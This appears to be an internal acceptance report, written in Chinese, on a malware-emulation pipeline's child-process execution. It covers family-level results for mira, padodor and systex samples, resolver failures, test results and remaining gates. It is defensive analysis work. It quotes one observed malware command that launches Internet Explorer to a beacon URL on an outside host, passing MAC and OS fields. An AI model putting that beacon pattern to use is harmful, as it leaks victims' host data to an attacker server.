# 步骤 6：受控 child execution 小批实验验收

> 日期：2026-11-06
>
> Speakeasy 基线提交：`c16440d8daef7ca343437acd0b9211cbf1ee71e4`
>
> 实验范围：state-only 小批、目标解析门槛、R3 dropped chain 证据审计、
> child execution 模型级回归
>
> 结论：**实验已执行，但受控 child execution 尚未达到可开启标准。**

## 1. 结论

本轮没有发现可以安全进入 depth=2 的证据。当前状态必须继续保持：

```text
execution_enabled = false
child_started = false
child_emulated = false
```

实验确认了三个独立阻断：

1. 真实 scheduler 尚未实现，pipeline 也没有把 child execution 接入
   `run_queue`。现有 `ChildSchedulerProtocol` 只有接口，没有生产实现。
2. pipeline 报告没有输出 `child_execution` 快照；当前真实报告仍是
   request-only，tracker 明确标记 `child_process_not_executed_by_engine`。
3. 4 个可解析 launch 的 `mira` 样本都不能通过稳定 self-target 解析。
   `ShellExecute` 报告的目标少了完整 SHA 文件名的最后一个字符，稳定
   resolver 返回 `target_unavailable`，不能据此加载 self bytes。

另外，6 个 `padodor` 的 `WinExec` 请求仍返回 `success_request` 和 API
结果 `32`，同时 `child_pid=null`。这不满足“target unavailable 时 API
不得虚假成功”的验收要求。

因此步骤 6 的执行结果是：

| 项目 | 结果 |
|---|---|
| state-only 小批运行 | **PASS** |
| child 实际执行 | **BLOCKED** |
| `mira` self-target | **FAIL** |
| `padodor` unavailable 语义 | **FAIL** |
| `systex` 不默认执行 IE | **PASS** |
| R3 dropped bytes 可解析性 | **PARTIAL** |
| depth=2 决策 | **NOT APPROVED** |

## 2. 输入与运行方式

全量证据来自：

```text
artifacts/dynamic_stage_new/uncertain_samples_20261101_suspicious_shell_w8/
```

该批次包含 1,229 个样本。汇总结果：

| 指标 | 数量 |
|---|---:|
| 样本 | 1,229 |
| 有 launch 的样本 | 81 |
| launch request | 96 |
| process object created | 94 |
| child started | 0 |
| child emulated | 0 |
| shell findings | 35 |
| command truncated | 0 |

真实小批重跑使用独立输出目录，child execution 保持默认关闭：

```text
.venv/bin/python -m src.dynamic_stage_new.cli \
  <sample.exe> \
  --timeout 120 \
  --max-instructions 300000000 \
  --output-dir speakeasy_unofficial/child_execution/step6_experiments/state_only/<family>/<sha>
```

命令只使用显式 CLI 参数，没有使用 `ENV_ENABLE=1`、环境变量开关、
monkey patch、动态属性注入或私有字段穿透。

## 3. state-only 小批结果

共重跑 12 个样本，12/12 父样本正常结束：

| 家族 | 实际重跑 | `ok` | launch | process object | child started | child emulated |
|---|---:|---:|---:|---:|---:|---:|
| `mira` | 4 | 4 | 4 | 4 | 0 | 0 |
| `padodor` | 6 | 6 | 6 | 6 | 0 | 0 |
| `systex` | 2 | 2 | 2 | 2 | 0 | 0 |
| 合计 | 12 | 12 | 12 | 12 | **0** | **0** |

原始报告位于：

```text
step6_experiments/state_only/<family>/<sha>/event_first_report.json
```

### 3.1 `mira`

当前 1,229 SHA 与家族清单的交集只有 7 个 `mira`；其中 4 个有 launch，
3 个在历史全量批次中为 `budget_exhausted`，没有 launch。`dev2.md`
记录的“8 个”不能从当前批次和当前家族清单中精确复现，不能把历史数量
静默补成 8。

4 个 launch 均调用 `shell32.ShellExecuteA`。目标形如：

```text
C:\Windows\system32\<sha-prefix>
```

每个目标都缺失两个可见部分：`.exe` 扩展名和完整文件名最后一个字符。
使用当前 `ChildTargetResolver` 对这四个真实目标复核：

| 样本 SHA | 解析结果 | reason |
|---|---|---|
| `493dc2de...c0b1e76` | unresolved | `target_unavailable` |
| `81a5f5c2...a797ee` | unresolved | `target_unavailable` |
| `82cf0cd8...182c82b` | unresolved | `target_unavailable` |
| `b977b18c...f1ed611` | unresolved | `target_unavailable` |

因此当前不能证明 `self` bytes 正确绑定，也不能满足 `mira` self + depth=1
的入口条件。

### 3.2 `padodor`

6 个样本全部产生一次 `kernel32.WinExec` 请求。目标是不存在的随机
System32 路径，例如：

```text
C:\Windows\system32\Jhpkee32
C:\Windows\system32\Ibbaem32
C:\Windows\system32\Hlklda32
C:\Windows\system32\Hkapbh32
C:\Windows\system32\Japfqg32
C:\Windows\system32\Pifldc32
```

稳定 resolver 对 6/6 返回 `target_unavailable`，且没有 child 执行。
这部分符合“不执行不存在目标”的要求。

但报告同时记录：

```text
launch_result = success_request
api_result = 32
child_pid = null
```

这仍表现为虚假成功。必须修正 API outcome 到 pid 回填语义后重新验收。

### 3.3 `systex`

当前 1,229 批次有 3 个 `systex` 家族样本：2 个正常产生 launch，1 个在
全量批次中为 `internal_error` 且没有 launch。两个正常样本均有：

```text
kernel32.WinExec
C:\Program Files\Internet Explorer\iexplore.exe
http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm
```

URL 和命令行完整保留；`child_started=0`、`child_emulated=0`。稳定 resolver
返回 `target_unavailable`，在没有显式 fixture 时不会执行 IE，满足当前
“不默认执行浏览器”的门槛。

## 4. R3 dropped-chain 审计

最新全量批次中 R3 的数量为：

| 指标 | 数量 |
|---|---:|
| R3 样本 | 25 |
| R3 finding occurrences | 35 |
| 恶意 R3 样本 | 23 |
| 良性 R3 样本 | 2 |

两个良性样本为：

```text
45a93d1969d921f82d7897ccd3065de6ce03d378be03d0fbff9c70bc78c18cd1
49ff71a51610dbab8831d35a6e4bad50e835ec84b32884b3107b2817402fb54c
```

逐样本清单见 [r3_sample_inventory.csv](r3_sample_inventory.csv)。

代表样本的完整 dropped PE 字节可以被稳定 resolver 解析，但前提是调用方
显式注册目标路径到该 artifact 的映射：

| 父样本 | 标签 | dropped SHA-256 | 格式/架构 | 显式 fixture 结果 |
|---|---|---|---|---|
| `20241370...b5df75e1` | malicious | `84447185...0090f49c` | PE32/x86 EXE | resolved |
| `45a93d19...8c18cd1` | benign | `d2e9c596...ad6eb44` | PE32/x86 EXE | resolved |
| `49ff71a5...402fb54c` | benign | `995ca25e...896ae2e1` | PE32/x86 EXE | resolved |

没有显式 fixture 时，三者的目标均返回 `target_unavailable`。这说明落盘
artifact 的 PE 解析能力可用，但“API 请求路径 -> dropped artifact bytes”
的生产接线尚未完成。不能把“显式注册 fixture 后能解析”记作真实 E2E PASS。

## 5. 模型级门槛回归

定向测试：

```text
112 passed in 0.22s
```

覆盖：

- request/target/admission 合同；
- parent/child budget 三项完全相等；
- parent、child、sibling 的 budget usage 独立；
- dispatcher 只在显式 enabled 且已注入 scheduler 时委托调度；
- loader 使用 `primary=False`；
- context 正常和异常路径都恢复 parent；
- one-shot entrypoint observation；
- runner 的 child result 与 parent outcome 隔离；
- report projector 和 dynamic adapter 的 lineage、ownership 校验。

Ruff：

```text
All checks passed!
```

这些测试证明模块在 fake/stub 组合下行为一致，不证明真实 scheduler 和
pipeline 已接入。

## 6. 后续门槛

在以下条件全部满足前，不得开放真实 child execution 或 depth=2：

1. 实现生产 scheduler，并让它成为唯一 queue/drain 路径。
2. pipeline 接入 dispatcher，报告输出完整 `child_execution`。
3. 修复 `ShellExecute` self target 的最后字符和扩展名解析。
4. 修复 `WinExec` 在 target unavailable 时的返回值与 pid 语义。
5. 完成 dropped request path 到 artifact bytes 的权威映射。
6. 重跑同样的 12 个 state-only 样本，确认父状态无漂移。
7. 在显式开关下只开启 `mira` depth=1，确认真实 `entrypoint_reached`、
   ownership、独立预算和 parent context 恢复。
8. `mira` 通过后再跑完整 dropped EXE，并单独复核两个良性安装器。
9. 最后才评估 depth=2。

